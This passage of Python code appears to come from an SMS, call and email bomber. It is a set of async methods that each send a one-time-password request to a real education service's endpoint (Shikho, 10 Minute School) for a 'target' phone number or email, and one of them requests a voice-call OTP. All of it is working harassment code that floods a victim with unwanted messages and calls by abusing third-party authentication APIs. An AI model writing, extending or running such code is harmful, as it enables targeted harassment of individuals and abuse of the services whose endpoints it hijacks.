
    async def api_api123___shikho_otp_v2(self):
        target = self.target
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target, "type": "login"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API123 - Shikho OTP V2", success, res.status, api_key="API123 - Shikho OTP V2")
                return success
        except Exception:
            await self.log_event("API123 - Shikho OTP V2", False, "Error", api_key="API123 - Shikho OTP V2")
            return False

    async def api_api124___10ms_otp(self):
        target = self.target
        url = "https://api.10minuteschool.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API124 - 10MS OTP", success, res.status, api_key="API124 - 10MS OTP")
                return success
        except Exception:
            await self.log_event("API124 - 10MS OTP", False, "Error", api_key="API124 - 10MS OTP")
            return False

    async def api_call12___shikho_call_otp(self):
        target = self.target
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target, "type": "login", "method": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL12 - Shikho Call OTP", success, res.status, api_key="CALL12 - Shikho Call OTP")
                return success
        except Exception:
            await self.log_event("CALL12 - Shikho Call OTP", False, "Error", api_key="CALL12 - Shikho Call OTP")
            return False

    async def api_email51___shikho_email_otp(self):
        target = self.target
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"email": target, "type": "registration"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL51 - Shikho Email OTP", success, res.status, api_key="EMAIL51 - Shikho Email OTP")
                return success
        except Exception:
            await self.log_event("EMAIL51 - Shikho Email OTP", False, "Error", api_key="EMAIL51 - Shikho Email OTP")
            return False
